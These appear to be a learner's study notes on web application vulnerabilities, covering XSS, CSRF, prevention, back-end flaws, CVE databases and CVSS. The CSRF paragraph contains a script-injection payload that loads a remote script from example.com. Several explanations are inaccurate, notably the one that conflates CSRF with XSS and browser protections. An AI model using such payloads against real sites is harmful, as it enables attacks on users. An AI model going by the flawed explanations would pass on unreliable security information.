# 1 - Web Applications

## Front-End Vulnerabilities

[HTML Injection ](1b-owasp-top-10-2021.md#id-3.-injection)

Type of injection where only front-end is affected. This includes web defacing too. I still don't see the exploitability in this.

[XSS](1b-owasp-top-10-2021.md#id-3.-injection)

Cross-site Scripting can be used like HTML Injection but besides DOM manipulation, you can also manipulate unsensitized user input and use Javascript to retrieve user data(whatever you can do with Javascript) We got - Reflected XSS - When result of XSS affects webapp after processing, as in search engines - Stored XSS - Kind of XSS which is retained in a db after reloading webpage - DOM XSS - using Javascript to steal front-end user data prolly

CSRF&#x20;

Cross-site Request Forgery is used to perform API calls and queries, utilizing XSS or HTTP request and response parameters to attack. Also can upload remote code to escalate privileges or do similar stuff. like so: `"><script src=//www.example.com/exploit.js></script>` Although, modern browsers already have anti-CSRF features that prevent them from executing remote codes.

### Prevention

* Sanitization - Removing special characters and non-standard characters from user input before displaying it or storing it.
* Validation - Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)
* Implement a Web Application Firewall or WAF

## [Back End Vulnerabilities](1c-server-side-vulnerabilities/)

1. Broken Access Control / Broken Authentication
2. Malicious file upload - when an attacker can upload malicious script or a file on the server that will not be validated and hence, executed on the server - potentially granting an attacker rce abilities.
3. Command Injection - Allowing an attacker to inject commands in a filename and uploading, or download a faulty plugin that can be utilized to execute commands on it.
4. SQL Injection or SQLi - executing misinterpreted SQL queries on a database and retrieving sensitive data from it.
5. SSRF
6. Access Control
7. Path Traversal

### Public Vulnerabilities

1. [CWE - Common Weakness Enumeration (mitre.org)](https://cwe.mitre.org/)
2. [NVD - Home (nist.gov)](https://nvd.nist.gov/)
3. [Vulnerability & Exploit Database - Rapid7](https://www.rapid7.com/db/)
4. [VULNERABILITY LAB - SECURITY VULNERABILITY RESEARCH LABORATORY - Best Independent Bug Bounty Programs, Responsible Disclosure & Vulnerability Coordination Platform - INDEX (vulnerability-lab.com)](https://www.vulnerability-lab.com/)
5. [Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)](https://www.exploit-db.com/)

These are just a few examples of Common Vulnerability and Exposure(CVE) databases.

Exploits are usually interesting from score 8-10 or that lead to RCE.

### Common Vulnerability Scoring System (CVSS)

It is an industry standard scoring system for system vulnerability scoring. CVSS uses **Base, Temporal, Environmental** metrics.

The most critical vulnerabilities for back-end components are found in web servers, as they are publicly accessible over the `TCP` protocol. External Web Application vulnerabilities may be exploited to gain access to back-end components.
